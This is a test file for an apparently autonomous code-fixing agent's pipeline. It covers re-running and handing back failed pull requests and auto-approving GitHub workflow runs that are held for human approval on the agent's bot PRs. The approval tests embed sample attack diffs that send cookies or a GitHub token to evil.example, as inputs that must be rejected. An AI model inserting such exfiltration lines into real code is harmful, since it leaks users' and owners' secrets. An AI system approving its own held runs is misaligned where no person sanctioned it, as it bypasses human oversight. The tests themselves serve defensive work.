// =============================================================================
// When the agent's own pull request goes red, the system must step in (owner, 2026-11-07: "on ANY failure the AI must
// recover by itself"). Before this, an issue with an open ai-fix PR was claimed forever, so a red PR sat unhandled.
// These pin: what counts as a real failure, the one re-run, the hand-back that closes the PR and tells the agent why,
// and that it can never loop (the hand-back adds no attempt of its own).
// No network: every API call is injected.
// =============================================================================
import { describe, it, expect } from 'vitest';
import {
    issueOfBranch, latestPerCheck, runIdOf, decideRecovery, failureDigest, handbackComment, recoveryBrief, run, RECOVERY_MARKER, MIN_AGE_MS,
    approvalVerdict, heldRuns,
} from '../autonomy/pr-recovery.mjs';
import { attemptsFrom } from '../autonomy/work-queue.mjs';

const NOW = Date.parse('2026-11-07T12:00:00Z');
const OLD = new Date(NOW - 3 * MIN_AGE_MS).toISOString();
const pr = (over = {}) => ({ number: 7, created_at: OLD, head: { ref: 'ai-fix/issue-524-1793997427', sha: 'abc' }, ...over });
const chk = (name, conclusion, over = {}) => ({ id: Math.floor(Math.random() * 1e6), name, status: 'completed', conclusion, completed_at: '2026-11-07T11:50:00Z', details_url: 'https://github.com/o/r/actions/runs/111/job/9', ...over });

describe('which pull requests are the agent\'s', () => {
    it('only ai-fix/issue-<n>-<timestamp> branches, never a person\'s', () => {
        expect(issueOfBranch('ai-fix/issue-524-1793997427')).toBe(524);
        expect(issueOfBranch('claude/project-thread-156kee')).toBeNull();
        expect(issueOfBranch('ai-fix/issue-524-x')).toBeNull();
        expect(issueOfBranch(undefined)).toBeNull();
    });
});

describe('reading the checks', () => {
    it('an older red run that a newer green run replaced is history', () => {
        const l = latestPerCheck([chk('Risk gate', 'failure', { completed_at: '2026-11-07T11:00:00Z' }), chk('Risk gate', 'success', { completed_at: '2026-11-07T11:30:00Z' })]);
        expect(l).toHaveLength(1);
        expect(l[0].conclusion).toBe('success');
    });
    it('finds the workflow run inside the details url', () => {
        expect(runIdOf({ details_url: 'https://github.com/o/r/actions/runs/42289892567/job/1' })).toBe(42289892567);
        expect(runIdOf({})).toBeNull();
    });
});

describe('deciding what to do', () => {
    it('does nothing to a PR that is not the agent\'s', () => {
        expect(decideRecovery({ pr: pr({ head: { ref: 'feature/x' } }), checkRuns: [chk('Tests', 'failure')], now: NOW }).action).toBe('wait');
    });
    it('waits while the first CI pass is young or running, or before anything reported (a bot run waits for approval)', () => {
        expect(decideRecovery({ pr: pr({ created_at: new Date(NOW - 60_000).toISOString() }), checkRuns: [chk('Tests', 'failure')], now: NOW }).action).toBe('wait');
        expect(decideRecovery({ pr: pr(), checkRuns: [chk('Tests', null, { status: 'in_progress' })], now: NOW }).action).toBe('wait');
        expect(decideRecovery({ pr: pr(), checkRuns: [], now: NOW }).reason).toMatch(/approval/);
    });
    it('a red Risk gate is a person\'s label to give, not a wrong fix', () => {
        expect(decideRecovery({ pr: pr(), checkRuns: [chk('Risk gate (sensitive paths need human approval)', 'failure')], now: NOW }).action).toBe('wait');
    });
    it('cancelled and skipped runs are not failures; a labeller or commenter cannot prove the code wrong', () => {
        expect(decideRecovery({ pr: pr(), checkRuns: [chk('Tests', 'cancelled'), chk('watch', 'skipped'), chk('Enable auto-merge', 'failure')], now: NOW }).action).toBe('wait');
    });
    it('a check that failed on its first attempt is re-run once before it is judged', () => {
        const d = decideRecovery({ pr: pr(), checkRuns: [chk('conftest', 'failure')], runAttempts: { 111: 1 }, now: NOW });
        expect(d.action).toBe('rerun');
        expect(d.failed).toEqual([{ name: 'conftest', runId: 111 }]);
    });
    it('a check that failed again after the re-run hands the issue back', () => {
        const d = decideRecovery({ pr: pr(), checkRuns: [chk('Tests + fuzz', 'failure'), chk('review', 'success')], runAttempts: { 111: 2 }, now: NOW });
        expect(d.action).toBe('handback');
        expect(d.reason).toMatch(/Tests \+ fuzz/);
    });
    it('all green means nothing to do', () => {
        expect(decideRecovery({ pr: pr(), checkRuns: [chk('Tests', 'success')], now: NOW }).action).toBe('wait');
    });
});

describe('telling the agent why it failed, without looping', () => {
    const digest = failureDigest([{ name: 'Tests + fuzz', output: { title: '2 tests failed', summary: '' } }], { 'Tests + fuzz': [{ path: 'test/a_test.js', start_line: 12, message: 'expected 3 to be 4' }, { message: 'The ubuntu-latest label will migrate to Ubuntu 26' }] });
    it('the digest is words: check, title, first annotations, and drops runner noise', () => {
        expect(digest).toContain('**Tests + fuzz**: 2 tests failed');
        expect(digest).toContain('test/a_test.js:12 expected 3 to be 4');
        expect(digest).not.toMatch(/ubuntu/);
    });
    it('the hand-back comment adds NO attempt of its own (the draft comment already spent one), so it cannot loop', () => {
        const c = handbackComment({ prNumber: 7, reason: 'still failing', digest });
        expect(c).toContain(RECOVERY_MARKER);
        expect(attemptsFrom([{ user: { login: 'github-actions[bot]' }, body: '<!-- wf-agent-attempt -->\nFix drafted', author_association: 'CONTRIBUTOR' }, { body: c }])).toBe(1);
    });
    it('the next try is shown the newest failure first, and an issue with no history gets nothing', () => {
        const c = handbackComment({ prNumber: 7, reason: 'still failing', digest });
        const brief = recoveryBrief([{ body: 'hello' }, { body: c }]);
        expect(brief).toMatch(/read this before writing anything/);
        expect(brief).toContain('expected 3 to be 4');
        expect(recoveryBrief([{ body: 'hello' }])).toBe('');
    });
});

describe('the whole pass, with the API injected', () => {
    function fake({ attempt }) {
        const calls = [];
        const checks = [chk('Tests + fuzz', 'failure', { id: 5 }), chk('review', 'success')];
        const fetchImpl = async (url, init = {}) => {
            const u = String(url).replace('https://api.github.com/repos/o/r', '');
            const method = init.method || 'GET';
            calls.push(`${method} ${u}`);
            const j = (b, status = 200) => ({ status, ok: status < 300, text: async () => JSON.stringify(b) });
            if (u.startsWith('/pulls?')) return j([pr()]);
            if (u.includes('/check-runs?')) return j({ check_runs: checks });
            if (u.startsWith('/actions/runs/111') && method === 'GET') return j({ run_attempt: attempt });
            if (u.includes('/annotations')) return j([{ message: 'expected 3 to be 4', path: 'test/a_test.js', start_line: 3 }]);
            return j({}, 201);
        };
        return { calls, fetchImpl };
    }
    const env = { GITHUB_TOKEN: 't', GITHUB_REPOSITORY: 'o/r' };
    it('first failure: re-runs the failed jobs and touches nothing else', async () => {
        const { calls, fetchImpl } = fake({ attempt: 1 });
        const out = await run({ env, fetchImpl, log: () => {}, now: NOW });
        expect(out[0].action).toBe('rerun');
        expect(calls).toContain('POST /actions/runs/111/rerun-failed-jobs');
        expect(calls.some((c) => c.startsWith('PATCH'))).toBe(false);
    });
    it('second failure: explains on the issue, closes the PR, deletes the branch, starts the agent again', async () => {
        const { calls, fetchImpl } = fake({ attempt: 2 });
        const out = await run({ env, fetchImpl, log: () => {}, now: NOW });
        expect(out[0].action).toBe('handback');
        expect(calls).toContain('POST /issues/524/comments');
        expect(calls).toContain('PATCH /pulls/7');
        expect(calls).toContain('DELETE /git/refs/heads/ai-fix/issue-524-1793997427');
        expect(calls).toContain('POST /actions/workflows/autonomous-fix.yml/dispatches');
    });
    it('a dry run reads and decides but changes nothing', async () => {
        const { calls, fetchImpl } = fake({ attempt: 2 });
        await run({ env, fetchImpl, log: () => {}, now: NOW, dryRun: true });
        expect(calls.filter((c) => !c.startsWith('GET'))).toEqual([]);
    });
});

// ---------------------------------------------------------------------------------------------------------------
// GitHub holds every run from the agent's bot login (`action_required`) until a person approves it, so no check ever ran on a
// bot PR (the owner saw "5 workflow approvals pending" on #653, 2026-11-20). The system approves them itself, but only when a
// program has read the file list and found what the build lane writes: a pull request's own workflows run with the repo's secrets.
// ---------------------------------------------------------------------------------------------------------------
describe('approving the runs GitHub holds for the agent', () => {
    const botPr = (over = {}) => ({ number: 653, user: { login: 'github-actions[bot]' }, head: { ref: 'ai-fix/issue-635-1795191383', sha: 'abc', repo: { full_name: 'o/r' } }, base: { repo: { full_name: 'o/r' } }, ...over });
    const f = (filename, patch) => ({ filename, status: 'modified', ...(patch === undefined ? {} : { patch }) });
    it('the real #653 change (a module and the agent\'s state file) is approved', () => {
        const v = approvalVerdict({ pr: botPr(), files: [f('wealthflow-cc-instalment-detail.js'), f('autonomy/state/issue-635.json')] });
        expect(v.ok).toBe(true);
    });
    it('a new module with its wiring (one script tag, one stamp comment, numeric ceilings) and its proving test is approved', () => {
        const html = '@@ -1,1 +1,3 @@\n+<!-- 2026-11-20: wealthflow-x-y.js, added by the build lane for #9 -->\n+    <script src="wealthflow-x-y.js" defer></script>\n x';
        const budget = '@@ -1 +1 @@\n-    totalJsBytes: 3_101_000, // old\n+    totalJsBytes: 3_121_500, // 2026-11-20: raised for wealthflow-x-y.js; measured 3113260';
        const v = approvalVerdict({ pr: botPr(), files: [f('wealthflow-x-y.js'), f('test/auto-wealthflow-x-y-9.test.js'), f('index.html', html), f('autonomy/perf-budget.mjs', budget)] });
        expect(v.ok).toBe(true);
    });
    it('a workflow, an autonomy script, a package file or any other file keeps the run held for a person', () => {
        for (const bad of ['.github/workflows/wealthflow-ci.yml', 'autonomy/route.mjs', 'package.json', 'api/ai.js', 'firestore.rules', 'vitest.config.js']) {
            const v = approvalVerdict({ pr: botPr(), files: [f('wealthflow-x.js'), f(bad)] });
            expect(v.ok, bad).toBe(false);
        }
    });
    it('index.html is approved only when every changed line is a build-lane script tag or stamp', () => {
        const sneaky = '@@ -1 +1,2 @@\n+<script>fetch("https://evil.example/"+document.cookie)</script>';
        expect(approvalVerdict({ pr: botPr(), files: [f('index.html', sneaky)] }).ok).toBe(false);
        const remote = '@@ -1 +1,2 @@\n+<script src="https://evil.example/x.js" defer></script>';
        expect(approvalVerdict({ pr: botPr(), files: [f('index.html', remote)] }).ok).toBe(false);
        expect(approvalVerdict({ pr: botPr(), files: [f('index.html')] }).ok).toBe(false); // no patch to read
    });
    it('perf-budget.mjs is approved only for numeric ceiling lines, never for code', () => {
        const code = '@@ -1 +1,2 @@\n+process.env.GH_TOKEN && fetch("https://evil.example/" + process.env.GH_TOKEN);';
        expect(approvalVerdict({ pr: botPr(), files: [f('autonomy/perf-budget.mjs', code)] }).ok).toBe(false);
    });
    it('only the agent\'s own bot login on a branch of this repository', () => {
        expect(approvalVerdict({ pr: botPr({ user: { login: 'someone' } }), files: [f('wealthflow-x.js')] }).ok).toBe(false);
        expect(approvalVerdict({ pr: botPr({ head: { ref: 'ai-fix/issue-635-1795191383', sha: 'a', repo: { full_name: 'fork/r' } } }), files: [f('wealthflow-x.js')] }).ok).toBe(false);
        expect(approvalVerdict({ pr: botPr({ head: { ref: 'feature/x', sha: 'a', repo: { full_name: 'o/r' } } }), files: [f('wealthflow-x.js')] }).ok).toBe(false);
    });
    it('too many files, or no file list, is never approved', () => {
        expect(approvalVerdict({ pr: botPr(), files: Array.from({ length: 9 }, (_, i) => f(`wealthflow-m${i}.js`)) }).ok).toBe(false);
        expect(approvalVerdict({ pr: botPr(), files: [] }).ok).toBe(false);
    });
    it('only completed runs that wait for approval are picked', () => {
        expect(heldRuns([{ id: 1, status: 'completed', conclusion: 'action_required' }, { id: 2, status: 'completed', conclusion: 'success' }, { id: 3, status: 'in_progress', conclusion: null }])).toEqual([1]);
    });

    function fake({ files, runs }) {
        const calls = [];
        const j = (body, status = 200) => ({ ok: status < 300, status, text: async () => JSON.stringify(body) });
        const fetchImpl = async (url, opts = {}) => {
            const u = String(url).replace('https://api.github.com/repos/o/r', ''); const method = opts.method || 'GET';
            calls.push(`${method} ${u.split('?')[0]}`);
            if (u.startsWith('/pulls?')) return j([botPr({ created_at: OLD })]);
            if (u.startsWith('/actions/runs?')) return j({ workflow_runs: runs });
            if (u.includes('/pulls/653/files')) return j(files);
            if (u.includes('/approve')) return j({}, 204);
            if (u.includes('/check-runs?')) return j({ check_runs: [] });
            return j({}, 201);
        };
        return { calls, fetchImpl };
    }
    const env = { GITHUB_TOKEN: 't', GITHUB_REPOSITORY: 'o/r' };
    const held = [{ id: 11, status: 'completed', conclusion: 'action_required' }, { id: 12, status: 'completed', conclusion: 'action_required' }];
    it('run(): approves every held run of a PR that passes the check', async () => {
        const { calls, fetchImpl } = fake({ files: [{ filename: 'wealthflow-cc-instalment-detail.js' }, { filename: 'autonomy/state/issue-635.json' }], runs: held });
        const out = await run({ env, fetchImpl, log: () => {}, now: NOW });
        expect(calls).toContain('POST /actions/runs/11/approve');
        expect(calls).toContain('POST /actions/runs/12/approve');
        expect(out.some((o) => o.action === 'approve')).toBe(true);
    });
    it('run(): approves nothing when the diff touches a workflow', async () => {
        const { calls, fetchImpl } = fake({ files: [{ filename: 'wealthflow-x.js' }, { filename: '.github/workflows/wealthflow-ci.yml' }], runs: held });
        await run({ env, fetchImpl, log: () => {}, now: NOW });
        expect(calls.some((c) => c.includes('/approve'))).toBe(false);
    });
    it('run(): WF_AUTO_APPROVE=0 and a dry run both approve nothing', async () => {
        const a = fake({ files: [{ filename: 'wealthflow-x.js' }], runs: held });
        await run({ env: { ...env, WF_AUTO_APPROVE: '0' }, fetchImpl: a.fetchImpl, log: () => {}, now: NOW });
        expect(a.calls.some((c) => c.includes('/approve'))).toBe(false);
        const b = fake({ files: [{ filename: 'wealthflow-x.js' }], runs: held });
        await run({ env, fetchImpl: b.fetchImpl, log: () => {}, now: NOW, dryRun: true });
        expect(b.calls.some((c) => c.includes('/approve'))).toBe(false);
    });
    it('run(): a refusal from GitHub is logged with where the setting is, and does not stop the pass', async () => {
        const { fetchImpl } = fake({ files: [{ filename: 'wealthflow-x.js' }], runs: held });
        const refuse = async (url, o) => (String(url).includes('/approve') ? { ok: false, status: 403, text: async () => 'forbidden' } : fetchImpl(url, o));
        const lines = [];
        const out = await run({ env, fetchImpl: refuse, log: (m) => lines.push(m), now: NOW });
        expect(lines.some((l) => /refused to approve run 11/.test(l) && /Settings > Actions/.test(l))).toBe(true);
        expect(Array.isArray(out)).toBe(true);
    });
});
